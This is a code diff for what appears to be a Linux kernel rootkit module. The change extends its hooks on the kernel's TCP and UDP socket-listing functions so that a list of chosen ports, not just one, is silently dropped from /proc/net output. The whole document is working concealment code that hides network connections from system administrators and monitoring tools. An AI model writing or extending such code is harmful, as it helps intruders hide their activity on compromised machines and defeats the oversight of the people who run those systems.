@@ -20,13 +20,39 @@ fun_int_seq_file_void udp_show_orig;
 typedef asmlinkage long (*fun_long_int_unsigned_long)(int, unsigned long __user*);
 fun_long_int_unsigned_long orig_socketcall;
 
+#define OUR_PROT_TCP 1
+#define OUR_PROT_UDP 2
+
+struct l_socket_to_hide {
+    int port;
+    int prot;
+    struct l_socket_to_hide* next;
+};
+
+struct l_socket_to_hide* sockets_to_hide = 0;
 
 int port_to_hide = -1;
 char* prot_to_hide = "";
 
 void hide_socket(char *protocol, int port){
-    prot_to_hide = protocol;
-    port_to_hide = port;
+    struct l_socket_to_hide* cur;
+    struct l_socket_to_hide* toHide;
+    toHide = kmalloc(sizeof(struct l_socket_to_hide), GFP_KERNEL);  
+    // fill struct with protocoll and port
+    toHide->next = 0;
+    toHide->port = port;
+    if (strcmp (protocol, "udp") == 0){
+        toHide->prot = OUR_PROT_UDP;
+    }
+    else {
+        toHide->prot = OUR_PROT_TCP;
+    }
+    // add the new socket to hide to the sockets to be hidden
+    toHide->next = sockets_to_hide;
+    sockets_to_hide = toHide;
+    for(cur = sockets_to_hide; cur != 0; cur = cur->next){
+        OUR_DEBUG("Hidden socket: %d on port %d\n", cur->prot, cur->port);
+    }
 }
 
 void hideTCP(int port){
@@ -45,9 +71,10 @@ static int hooked_udp_show(struct seq_file* file, void* v){
     int port;
     struct sock* sk;
     struct inet_sock* s;
-    if (strcmp(prot_to_hide, "udp")){
-        return udp_show_orig(file, v);
-    }
+    struct l_socket_to_hide* cur;
+    // if (strcmp(prot_to_hide, "udp")){
+    //     return udp_show_orig(file, v);
+    // }
     if (v == SEQ_START_TOKEN) {
         return udp_show_orig(file, v);
     }
@@ -56,9 +83,14 @@ static int hooked_udp_show(struct seq_file* file, void* v){
     OUR_DEBUG("pointer : %p\n", s);
     port = ntohs(s->sport);
     OUR_DEBUG("udp_show port: %d\n", s->sport);
-    if (port == port_to_hide){
-        return 0;
-    } 
+    if (sockets_to_hide == 0){
+        return udp_show_orig(file, v);
+    }
+    for(cur = sockets_to_hide; cur != 0; cur = cur->next){
+        if (port == cur->port && cur->prot == OUR_PROT_UDP){
+            return 0;
+        } 
+    }
     return udp_show_orig(file, v);
 }
 
@@ -66,20 +98,28 @@ static int hooked_tcp_show(struct seq_file* file, void* v){
     int port;
     struct sock* sk;
     struct inet_sock* s;    
-    if (strcmp(prot_to_hide, "tcp")){
-        return tcp_show_orig(file, v);
-    }
+    struct l_socket_to_hide* cur;
+    // if (strcmp(prot_to_hide, "tcp")){
+    //     return tcp_show_orig(file, v);
+    // }
     if (v == SEQ_START_TOKEN) {
         return tcp_show_orig(file, v);
     }
     sk = (struct sock*) v;
     s = inet_sk(sk);
-    OUR_DEBUG("pointer : %p\n", s);
+    OUR_DEBUG("tcp pointer : %p\n", s);
     port = ntohs(s->sport);
+    OUR_DEBUG("tcp pointer2: %p\n", s);
+    if (sockets_to_hide == 0){
+        return tcp_show_orig(file, v);
+    }
     OUR_DEBUG("tcp_show port: %d, %d\n", port, port_to_hide);
-    if (port == port_to_hide){
-        return 0;
-    } 
+    for(cur = sockets_to_hide; cur != 0; cur = cur->next){
+        OUR_DEBUG("Current TCP port checked: %d against in list %p\n", port, cur);
+        if (port == cur->port && cur->prot == OUR_PROT_TCP){
+            return 0;
+        } 
+    }
     return tcp_show_orig(file, v);
 }
 
